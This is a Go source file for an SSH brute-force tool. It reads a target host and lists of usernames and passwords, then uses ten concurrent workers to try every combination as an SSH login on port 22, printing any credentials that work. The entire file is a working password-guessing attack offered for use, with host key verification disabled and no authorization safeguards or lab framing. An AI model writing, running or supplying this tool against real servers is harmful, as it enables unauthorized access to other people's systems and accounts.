package main

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

type Config struct {
	Host     string
	Port     string
	UserList []string
	PassList []string
}

func main() {
	fmt.Println("\n=== SSH Brute Force Program ===")
	config := parseArgs()
	fmt.Printf("\n[+] Target: %s:%s\n\n", config.Host, config.Port)

	var wg sync.WaitGroup
	taskChan := make(chan [2]string, 10)

	// Start workers
	for i := 0; i < 10; i++ {
		wg.Add(1)
		go worker(&wg, config.Host, config.Port, taskChan)
	}

	fmt.Println("[*] Adding tasks to the queue...")
	for _, username := range config.UserList {
		for _, password := range config.PassList {
			fmt.Printf("  -> Queued: %s : %s\n", username, password)
			taskChan <- [2]string{username, password}
		}
	}

	close(taskChan)
	fmt.Println("\n[*] All tasks have been queued.")

	wg.Wait()
	fmt.Println("\n=== Program Completed ===")
}

func parseArgs() Config {
	var config Config

	for i := 1; i < len(os.Args); i++ {
		switch os.Args[i] {
		case "-h":
			if i+1 < len(os.Args) {
				config.Host = os.Args[i+1]
				i++
			} else {
				log.Fatal("[-] Missing IP or hostname.")
			}
		case "-p":
			if i+1 < len(os.Args) {
				config.PassList = []string{os.Args[i+1]}
				i++
			} else {
				log.Fatal("[-] Missing password.")
			}
		case "-P":
			if i+1 < len(os.Args) {
				config.PassList = loadFile(os.Args[i+1])
				i++
			} else {
				log.Fatal("[-] Missing password wordlist file.")
			}
		case "-u":
			if i+1 < len(os.Args) {
				config.UserList = []string{os.Args[i+1]}
				i++
			} else {
				log.Fatal("[-] Missing username.")
			}
		case "-U":
			if i+1 < len(os.Args) {
				config.UserList = loadFile(os.Args[i+1])
				i++
			} else {
				log.Fatal("[-] Missing username wordlist file.")
			}
		}
	}

	if config.Host == "" || len(config.PassList) == 0 || len(config.UserList) == 0 {
		log.Fatal("[-] Required parameters are missing! Usage: -h [host] -p/-P [password/password list] -u/-U [user/user list]")
	}

	config.Port = "22"
	return config
}

func loadFile(filename string) []string {
	file, err := os.Open(filename)
	if err != nil {
		log.Fatalf("[-] Could not open file: %v", err)
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		log.Fatalf("[-] Could not read file: %v", err)
	}

	return lines
}

func worker(wg *sync.WaitGroup, host, port string, tasks <-chan [2]string) {
	defer wg.Done()
	fmt.Println("[*] Worker started.")
	for task := range tasks {
		username, password := task[0], task[1]
		fmt.Printf("[~] Trying: %s : %s\n", username, password)
		if trySSH(host, port, username, password) {
			fmt.Printf("[+] Success: %s : %s\n", username, password)
		}
	}
	fmt.Println("[*] Worker finished.")
}

func trySSH(host, port, username, password string) bool {
	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         5 * time.Second,
	}

	conn, err := ssh.Dial("tcp", host+":"+port, config)
	if err != nil {
		fmt.Printf("[-] Connection error (%s:%s) -> %v\n", username, password, err)
		return false
	}

	conn.Close()
	return true
}
